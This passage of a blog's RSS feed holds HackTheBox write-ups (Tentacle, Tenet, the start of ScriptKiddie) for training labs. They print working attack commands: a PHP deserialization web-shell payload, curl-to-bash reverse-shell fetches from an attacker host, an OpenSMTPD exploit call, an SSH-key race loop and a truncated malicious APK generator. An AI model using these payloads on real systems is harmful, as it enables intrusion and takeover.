&lt;p&gt;And we get a password!!&lt;/p&gt;
&lt;p&gt;we can ssh into the box as the user &lt;code&gt;katie&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;katie.png&#34;&gt;
&lt;h1 id=&#34;p-stylecolorredroot-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Flag &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Let&amp;rsquo;s check if we can run anything as root&lt;/p&gt;
&lt;img src=&#34;sudo.png&#34;&gt;
&lt;p&gt;initctl binary own SUDO privileges. This binary allows us to interact with Upstart!&lt;/p&gt;
&lt;p&gt;initctl uses the configuration files located at &lt;code&gt;/etc/init&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The trick is to either create our own config file or inject a malicious code on an existing config file then restart it in order to execute our code&lt;/p&gt;
&lt;img src=&#34;error.png&#34;&gt;
&lt;p&gt;Sadly we don&amp;rsquo;t have write access!&lt;/p&gt;
&lt;p&gt;Scrolling a bit in the files we can see that we can edit few files because we&amp;rsquo;re in the &lt;code&gt;developers&lt;/code&gt; group&lt;/p&gt;
&lt;img src=&#34;test.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s edit one of these&lt;/p&gt;
&lt;img src=&#34;test1.png&#34;&gt;
&lt;p&gt;Then we need to start the service&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo /sbin/initctl start test
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;root.png&#34;&gt;
&lt;p&gt;And we rooted the box&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Tentacle Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-tentacle/</link>
      <pubDate>Fri, 18 Jun 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-tentacle/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV 10.10.10.224 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-06-18 13:07:47Z)
3128/tcp open   http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
9090/tcp closed zeus-admin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have 3 ports open:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;22/ssh : OpenSSH 8.0&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;53/dns : ISC BIND 9.11.20&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;88/kerberos : MIT Kerberos&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-server-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Server &lt;/p&gt;&lt;/h2&gt;
&lt;img src=&#34;88.png&#34;&gt;
&lt;p&gt;We get a username and two domain names !&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;j.nakazawa@realcorp.htb
srv01.realcorp.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s add them  to &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;realcorp.png&#34;&gt;
&lt;img src=&#34;srv.png&#34;&gt;
&lt;p&gt;Nothing interesting, let&amp;rsquo;s move on&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreenkerberos-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Kerberos &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;We have a valid username and a domain! let&amp;rsquo;s try to dump his KRBASREP5 hash&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py realcorp.htb/j.nakazawa -no-pass
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;kerb.png&#34;&gt;
&lt;p&gt;But sadly it&amp;rsquo;s uncrackable, let&amp;rsquo;s move on&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreen-dns-enump&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt; DNS ENUM&lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;This machine has a DNS and proxy service running, we can guess that it&amp;rsquo;s routing trafics to other machines&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s find out&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dnsenum --enum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt realcorp.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;dnsenum.png&#34;&gt;
&lt;p&gt;We have more IPs and domains, but we can&amp;rsquo;t access anyone of them.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll be using proxychains ( Dynamic chain )&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll be adding these 3 lines to &lt;code&gt;/etc/proxychains.conf&lt;/code&gt; and the domains to &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http 10.10.10.224   3128
http 127.0.0.1      3128
http 10.197.243.77  3128
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;p-stylecolorredfoothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Let&amp;rsquo;s first run nmap on the new IPs&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo proxychains4 -f /etc/proxychains.conf nmap -Pn -sT -v 10.197.243.31
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There is a webserver running, let&amp;rsquo;s try to access it&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf firefox
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;nginx.png&#34;&gt;
&lt;p&gt;Since this ip is mapped to  &lt;code&gt;wpad.realcorp.htb&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can now get the web proxy auto discovery config (wpad.dat)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf curl http://wpad.realcorp.htb/wpad.dat
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;wpad.png&#34;&gt;
&lt;p&gt;We have another network IP &lt;code&gt;10.241.251.0&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf nmap 10.241.251.0/24 -Pn 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After waiting a bit, we can get an active host 10.241.251.113&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf nmap 10.241.251.113 -sV -Pn
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can grab an exploit from exploitdb&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I&amp;rsquo;ll be using this exploit : &lt;a href=&#34;https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py&#34;&gt;https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf python3 exp.py 10.241.251.113 25 10.10.14.68 9001 j.nakazawa@realcorp.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;And we&amp;rsquo;re on the box&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorred-user-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; User Flag &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;An interesting file in the user home directory&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM&amp;gt;6Z~64_
tls_fingerprint	C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We found a password, but i couldn&amp;rsquo;t ssh into the box with it&lt;/p&gt;
&lt;p&gt;The trick is to generate a tgs kk
to ssh into the box&lt;/p&gt;
&lt;p&gt;But first, we need to edit &lt;code&gt;/etc/krb5.conf&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;kk.png&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;I was stuck at this part for a while trying to figure out what i did wrong, until i gave up and asked someone for a hint &lt;code&gt;dns_canonicalize_hostname = false&lt;/code&gt; was needed&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And let&amp;rsquo;s generate the ticket&lt;/p&gt;
&lt;img src=&#34;klist.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s try to ssh as j.nakazawa&lt;/p&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredroot-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Flag &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;After running LinPEAS, we can see that there a cronjob&lt;/p&gt;
&lt;img src=&#34;cron.png&#34;&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It copies everything from &lt;code&gt;/var/log/squid/&lt;/code&gt; to &lt;code&gt;/home/admin&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So the trick is to create &lt;code&gt;.k5login&lt;/code&gt; in &lt;code&gt;/var/log/squid&lt;/code&gt; so it gets copied to the admin&amp;rsquo;s user home directory and we ssh into it&lt;/p&gt;
&lt;blockquote&gt;
&lt;img src=&#34;k5.png&#34;&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;admin.png&#34;&gt;
&lt;p&gt;Now we&amp;rsquo;re the admin user&lt;/p&gt;
&lt;p&gt;Enumerating a bit, we can find someone interesting  &lt;code&gt;/etc/krb5.keytab&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It&amp;rsquo;s extracted from the KDC database of &amp;ldquo;principals&amp;rdquo; and which contain the encryption key for a service or a host.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;keytab.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s open the kadmin console&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;then  add the root as a principal to the database&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html&#34;&gt;https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;add_principal root@REALCORP.HTB
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;rootad.png&#34;&gt;
&lt;p&gt;Now we can get login as root with &lt;code&gt;ksu&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://linux.die.net/man/1/ksu&#34;&gt;https://linux.die.net/man/1/ksu&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;root.png&#34;&gt;
&lt;p&gt;And we rooted the box!&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Tenet Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-tenet/</link>
      <pubDate>Sat, 12 Jun 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-tenet/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.223 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have two ports open&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;22/ssh :  OpenSSH 7.6p1&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;80/http : Apache httpd 2.4.29&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-enum-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enum &lt;/p&gt;&lt;/h2&gt;
&lt;img src=&#34;apachedef.png&#34;&gt;
&lt;p&gt;Nothing interesting, let&amp;rsquo;s try to add &lt;code&gt;tenet.htb&lt;/code&gt; to our /etc/hosts&lt;/p&gt;
&lt;img src=&#34;tenet1.png&#34;&gt;
&lt;p&gt;It&amp;rsquo;s a wordpress page, after enumerating a bit we can find an interesting comment&lt;/p&gt;
&lt;img src=&#34;comment.png&#34;&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;We first have a username &amp;ldquo;neil&amp;rdquo;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A sator php file and it&amp;rsquo;s backup has been deleted?&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;sator404.png&#34;&gt;
&lt;p&gt;It didn&amp;rsquo;t work in &lt;code&gt;tenet.htb&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try on the main website&lt;/p&gt;
&lt;img src=&#34;sator1.png&#34;&gt;
&lt;p&gt;The comment mentioned a backup file aswell&lt;/p&gt;
&lt;p&gt;let&amp;rsquo;s make a small list for some backup extension to fuzz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;backup
bck
old
save
bak
sav
copy
old
orig
tmp
txt
back
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ffuf -c -w backup -u http://10.10.10.223/sator.php.FUZZ
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;bak.png&#34;&gt;
&lt;p&gt;And there is a file named &amp;ldquo;sator.php.bak&amp;rdquo;&lt;/p&gt;
&lt;p&gt;And we get the source of the &lt;code&gt;sator.php&lt;/code&gt; file&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredfoothold--p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold  &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class DatabaseExport
{
	public $user_file = &#39;users.txt&#39;;
	public $data = &#39;&#39;;

	public function update_db()
	{
		echo &#39;[+] Grabbing users from text file &amp;lt;br&amp;gt;&#39;;
		$this-&amp;gt; data = &#39;Success&#39;;
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . &#39;/&#39; . $this -&amp;gt;user_file, $this-&amp;gt;data);
		echo &#39;[] Database updated &amp;lt;br&amp;gt;&#39;;
	//	echo &#39;Gotta get this working properly...&#39;;
	}
}

$input = $_GET[&#39;arepo&#39;] ?? &#39;&#39;;
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -&amp;gt; update_db();
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;ndash;&amp;gt; PHP Insecure Deserialization&lt;/p&gt;
&lt;p&gt;We can actually create a simple cmd shell&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll use this php script to forge our serialized payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class DatabaseExport
{
	public $user_file = &#39;cmd.php&#39;;
	public $data = &#39;&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;])?&amp;gt;&#39;;
}

$bad= new DatabaseExport;
echo serialize($bad);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Output:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;O:14:&amp;quot;DatabaseExport&amp;quot;:2:{s:9:&amp;quot;user_file&amp;quot;;s:7:&amp;quot;cmd.php&amp;quot;;s:4:&amp;quot;data&amp;quot;;s:28:&amp;quot;&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;])?&amp;gt;&amp;quot;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;our final payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22cmd.php%22%3Bs%3A4%3A%22data%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3F%3E%22%3B%7D
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;arepo.png&#34;&gt;
&lt;p&gt;Seems like it worked! let&amp;rsquo;s check if we have our cmd working&lt;/p&gt;
&lt;img src=&#34;www.png&#34;&gt;
&lt;p&gt;And yes! we have code exec&lt;/p&gt;
&lt;p&gt;let&amp;rsquo;s get a reverse shell on the machine&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;http://10.10.10.223/cmd.php?cmd=curl%20http://10.10.14.105:8000/x|bash
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;x is just a reverse shell &lt;a href=&#34;https://resh.vercel.app/&#34;&gt;https://resh.vercel.app/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorreduser-flag--p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User flag  &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Let&amp;rsquo;s check the &lt;code&gt;wp-config.php&lt;/code&gt; for creds&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
/** MySQL database username */
define( &#39;DB_USER&#39;, &#39;neil&#39; );

/** MySQL database password */
define( &#39;DB_PASSWORD&#39;, &#39;Opera2112&#39; );

&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;user.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredroot-flag--p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root flag  &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;img src=&#34;sudo.png&#34;&gt;
&lt;p&gt;neil can run &lt;code&gt;/usr/local/bin/enableSSH.sh&lt;/code&gt; as root&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash

checkAdded() {
	sshName=$(/bin/echo $key | /usr/bin/cut -d &amp;quot; &amp;quot; -f 3)

	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

		/bin/echo &amp;quot;Successfully added $sshName to authorized_keys file!&amp;quot;

	else

		/bin/echo &amp;quot;Error in adding $sshName to authorized_keys file!&amp;quot;

	fi

}
checkFile() {

	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

		/bin/echo &amp;quot;Error in creating key file!&amp;quot;

		if [[ -f $1 ]]; then /bin/rm $1; fi

		exit 1

	fi

}
addKey() {

	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

	(umask 110; touch $tmpName)

	/bin/echo $key &amp;gt;&amp;gt;$tmpName

	checkFile $tmpName

	/bin/cat $tmpName &amp;gt;&amp;gt;/root/.ssh/authorized_keys

	/bin/rm $tmpName

}
key=&amp;quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&amp;quot;
addKey
checkAdded

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;What seems to be interesting is the &lt;code&gt;addKey&lt;/code&gt; function which creates a temporary file with a random name then it puts the content of the &lt;code&gt;key&lt;/code&gt; variable into it then the key is copied to the &lt;code&gt;authorized_keys&lt;/code&gt; file&lt;/p&gt;
&lt;p&gt;What seems odd about this function is the &lt;code&gt;mktemp&lt;/code&gt;  let&amp;rsquo;s google about this function&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Caveats:
In general, avoid using mktemp(), because a hostile process can exploit a race condition in the time between the generation of a temporary filename by mktemp() and the invoker&#39;s use of the temporary name. Use mkstemp() instead.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To sum up, mktemp is vulnerable to &lt;code&gt;race condition&lt;/code&gt;  we&amp;rsquo;ll take advantage of the time gap resulted when using this function!&lt;/p&gt;
&lt;p&gt;we&amp;rsquo;ll inject our public ssh key into the temporary file created&lt;/p&gt;
&lt;p&gt;First we let the while loop run&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;while true; do echo &amp;quot;ssh-rsa AAAAB3NzaC---SNIP---DgRk=&amp;quot; | tee  /tmp/ssh-* ;done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;then we execute the script&lt;/p&gt;
&lt;p&gt;and ssh into the box as root&lt;/p&gt;
&lt;img src=&#34;root.png&#34;&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - ScriptKiddie Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-scriptkiddie/</link>
      <pubDate>Sat, 05 Jun 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-scriptkiddie/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.226 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Discovered open port 22/tcp on 10.10.10.226
Discovered open port 5000/tcp on 10.10.10.226
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;nmap.png&#34;&gt;
&lt;p&gt;We have two ports open&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;22/SSH :  OpenSSH 8.2p1 Ubuntu 4ubuntu0.1&lt;/li&gt;
&lt;li&gt;5000/HTTP :  Werkzeug httpd 0.16.1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;ndash;&amp;gt; Service versions seem to be up-to-date, we don&amp;rsquo;t really focus on them&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-server-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Server &lt;/p&gt;&lt;/h2&gt;
&lt;img src=&#34;web.png&#34;&gt;
&lt;p&gt;&amp;ndash;&amp;gt; We have so many user inputs, first thing we should check if there is any command injections as it seem to be using linux binaries which can lead to RCE&lt;/p&gt;
&lt;img src=&#34;web1.png&#34;&gt;
&lt;img src=&#34;web2.png&#34;&gt;
&lt;img src=&#34;web3.png&#34;&gt;
&lt;p&gt;&amp;ndash;&amp;gt; It seems that the input is hardcoded, taking into considerating that this is an easy box i don&amp;rsquo;t that we should try to bypass these filters and just move on&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredfoothold--user-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &amp;amp; User flag &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Another interesting thing is the file upload that takes a msfvenom template!&lt;/p&gt;
&lt;p&gt;Searching a bit in google can lead us to what we want! We can craft a Android payload template and get a shell on the box&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md&#34;&gt;https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Payload:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b32encode

payload = &#39;curl http://10.10.14.54:1337/x|bash&#39;


payload_b32 = b32encode(payload.encode()).decode()
dname = f&amp;quot;CN=&#39;|echo {payload_b32} | base32 -d | sh #&amp;quot;

print(f&amp;quot;[+] Manufacturing evil apkfile&amp;quot;)
print(f&amp;quot;Payload: {payload}&amp;quot;)
print(f&amp;quot;-dname: {dname}&amp;quot;)
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, &amp;quot;evil.apk&amp;quot;)
empty_file = os.path.join(tmpdir, &amp;quot;empty&amp;quot;)
keystore_file = os.path.join(tmpdir, &amp;quot;signing.keystore&amp;quot;)
storepass = keypass = &amp;quot;password&amp;quot;
key_alias = &amp;quot;signing.key&amp;quot;

# Touch empty_file
open(empty_file, &amp;quot;w&amp;quot;).close()

# Create apk_file
subprocess.check_call([&amp;quot;zip&amp;quot;, &amp;quot;-j&amp;quot;, apk_file, empty_file])

# Generate signing key with malicious -dname
